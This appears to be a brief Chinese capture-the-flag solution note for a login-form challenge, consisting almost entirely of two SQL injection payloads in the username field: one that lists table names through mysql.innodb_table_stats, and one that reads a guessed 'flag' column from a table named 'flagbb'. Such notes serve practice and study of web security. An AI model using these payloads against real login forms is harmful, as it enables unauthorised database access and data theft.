# 知识点
# 思路
```plsql
# 通过mysql.innodb_table_stats获取表名
username=1',(select(group_concat(table_name))from(mysql.innodb_table_stats)))%23&password=1
# 盲猜字段名为flag
username=1',(select(flag)from(flagbb)))%23&password=1
```
